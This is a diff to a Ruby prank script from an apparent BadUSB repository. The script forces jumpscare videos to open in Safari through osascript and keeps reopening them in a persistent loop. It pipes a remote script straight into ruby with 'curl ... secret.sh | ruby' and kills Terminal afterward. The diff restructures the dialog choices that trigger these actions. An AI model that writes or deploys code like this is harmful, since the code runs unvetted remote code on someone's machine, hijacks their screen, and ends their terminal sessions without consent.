@@ -82,7 +82,7 @@ def persistent_jumpscare(video_url)
     system("open -a Safari '#{html_file}'")
     # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.75 seconds (0.5 + 0.25 extra) before unhiding.
+    # Wait 0.75 seconds (0.5 + 0.25 extra).
     sleep 0.75
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
@@ -102,7 +102,6 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If not found, the loop will re-open the page.
     sleep 3
   end
 end
@@ -110,25 +109,6 @@ end
 # --- Run Secret (Rickroll) Script ---
 def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
-end
-
-# --- Subscriber Action ---
-def subscriber_action(choice)
-  ch = choice.strip.downcase
-  case ch
-  when "hawk"
-    run_secret_script
-    system("killall Terminal")
-    exit 0
-  when "tuah"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
-  when "sydney lover"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-  when "girlpower"
-    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-  else
-    puts "Unexpected button choice: #{choice}"
-  end
 end
 
 # --- Main Program Flow ---
@@ -139,18 +119,42 @@ if subscribed.nil?
 end
 
 if subscribed.downcase == "no"
-  # Non-subscriber branch: Immediately play jumpscare using jumpscare2.mp4.
+  # Non-subscriber branch: Immediately trigger jumpscare using jumpscare2.mp4.
   sleep 1
   video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
   persistent_jumpscare(video_url)
 else
-  # Subscriber branch: Display a dialog with four buttons.
-  button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah", "Girlpower"], "Hawk")
-  if button_choice.nil?
+  # Subscriber branch: First prompt with three buttons: "Hawk", "Tuah", "Next"
+  first_choice = display_dialog("Choose a button:", ["Hawk", "Tuah", "Next"], "Hawk")
+  if first_choice.nil?
     puts "No button chosen. Exiting."
     exit 0
   end
-  subscriber_action(button_choice)
+  first_choice = first_choice.strip.downcase
+  if first_choice == "hawk"
+    run_secret_script
+    system("killall Terminal")
+    exit 0
+  elsif first_choice == "tuah"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
+  elsif first_choice == "next"
+    # Show a second prompt with two buttons: "Sydney lover" and "Slay"
+    second_choice = display_dialog("Choose a button:", ["Sydney lover", "Slay"], "Sydney lover")
+    if second_choice.nil?
+      puts "No button chosen. Exiting."
+      exit 0
+    end
+    second_choice = second_choice.strip.downcase
+    if second_choice == "sydney lover"
+      persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
+    elsif second_choice == "slay"
+      persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+    else
+      puts "Unexpected button choice in second prompt: #{second_choice}"
+    end
+  else
+    puts "Unexpected button choice in first prompt: #{first_choice}"
+  end
   system("killall Terminal")
   exit 0
 end
